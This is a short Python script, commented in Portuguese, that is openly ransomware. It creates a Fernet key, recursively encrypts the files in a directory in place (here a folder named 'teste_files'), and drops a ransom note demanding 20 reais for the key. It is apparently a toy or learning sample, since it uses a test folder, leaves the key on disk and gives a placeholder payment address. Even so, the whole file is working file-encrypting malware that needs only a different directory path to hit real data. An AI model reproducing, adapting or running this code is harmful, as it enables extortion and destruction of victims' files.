from cryptography.fernet import Fernet
import os

# Método que gera uma chave e a salva
def gerar_chave():
	chave = Fernet.generate_key()
	with open("chave.key", "wb") as chave_file:
		chave_file.write(chave)

# Método que carrega a chave salva
def carregar_chave():
	return open("chave.key", "rb").read()

# Método que criptografa um único arquivo
def criptografar_arquivo(arquivo, chave):
	f = Fernet(chave)
	with open(arquivo, "rb") as file:
		dados = file.read()
	dados_encriptados = f.encrypt(dados)
	with open(arquivo, "wb") as file:
		file.write(dados_encriptados)

# Método que encontra arquivos para criptografar
def encontrar_arquivos(diretorio):
	lista = []
	for raiz, _, arquivos in os.walk(diretorio):
		for nome in arquivos:
			caminho = os.path.join(raiz, nome)
			if nome != "ransomware" and not nome.endswith(".key"):
				lista.append(caminho)
	return lista

# Método que cria uma mensagem de resgate
def criar_mensgem_resgate():
	with open("LEIA ISSO.txt", "w") as f:
		f.write("Seus arquivos foram criptografados!\n")
		f.write("Envie 20 reais para o endereço xyz e envie o comprovante!\n")
		f.write("Depois disso, enviaremos a chave para você recuperar seus dados!")

# Método de execução principal
def main():
	gerar_chave()
	chave = carregar_chave()
	arquivos = encontrar_arquivos("teste_files")
	for arquivo in arquivos:
		criptografar_arquivo(arquivo, chave)
	criar_mensgem_resgate()
	print("Ransomware executado! Arquivos criptografados!")

if __name__=="__main__":
	main()
